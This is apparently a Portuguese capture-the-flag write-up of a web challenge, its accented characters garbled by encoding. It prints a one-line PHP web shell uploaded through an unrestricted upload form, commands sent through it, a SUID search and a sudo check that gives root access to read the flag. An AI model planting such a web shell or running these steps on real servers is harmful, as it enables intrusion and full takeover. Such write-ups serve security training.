üß© Descri√ß√£o do desafio:

Desafio de Web Exploitation onde havia uma funcionalidade de upload de arquivos na p√°gina de perfil (upload.php). O objetivo era encontrar uma forma de explorar essa funcionalidade para obter execu√ß√£o remota de comandos (RCE) 
e escalar privil√©gios at√© root, a fim de capturar a flag.

üîé Etapa 1 ‚Äì Reconhecimento da funcionalidade de upload

A funcionalidade permitia o upload de arquivos .txt, mas ao testar com arquivos .php, foi poss√≠vel realizar o upload sem restri√ß√µes.

A URL final do upload era acess√≠vel diretamente:

http://<site>/uploads/shell.php

üß™ Etapa 2 ‚Äì Execu√ß√£o remota com Web Shell

Foi feito o upload de um arquivo shell.php com o seguinte conte√∫do:

<?php system($_GET['cmd']); ?>

Ao acessar:

/uploads/shell.php?cmd=whoami

A resposta foi:

www-data

Confirmando a execu√ß√£o remota de comandos (RCE) com permiss√µes do usu√°rio do servidor web.

üìÇ Etapa 3 ‚Äì Navega√ß√£o e enumera√ß√£o do sistema

Utilizando comandos como:

/uploads/shell.php?cmd=pwd
/uploads/shell.php?cmd=ls%20/

Foi poss√≠vel subir diret√≥rios (../) e explorar o sistema at√© localizar a pasta /root.

Entretanto, ao tentar acess√°-la:

/uploads/shell.php?cmd=ls%20/root

A resposta foi vazia ‚Äî indicando falta de permiss√£o de leitura para o usu√°rio www-data.

üß® Etapa 4 ‚Äì Escalonamento de privil√©gio com SUID + Sudo

Com o comando:

/uploads/shell.php?cmd=find%20/%20-perm%20-u%3Ds%20-type%20f%202>%20/dev/null

Foi identificado que o bin√°rio /usr/bin/sudo possu√≠a a flag SUID ativa. Em seguida, foi executado:

/uploads/shell.php?cmd=sudo%20-l

A resposta foi:

User www-data may run the following commands on <host>:
    (ALL) NOPASSWD: ALL

O que significava que o usu√°rio www-data podia executar qualquer comando como root sem necessidade de senha.

üëë Etapa 5 ‚Äì Acesso root e captura da flag

Foi executado o comando:

/uploads/shell.php?cmd=sudo%20cat%20/root/flag.txt

E e conseguimos capturar a flag.


‚úÖ Resumo das t√©cnicas usadas:

    Web Shell Upload para obter RCE

    Enumera√ß√£o do sistema de arquivos via web shell

    SUID check com find

    Sudo abuse com NOPASSWD: ALL para root
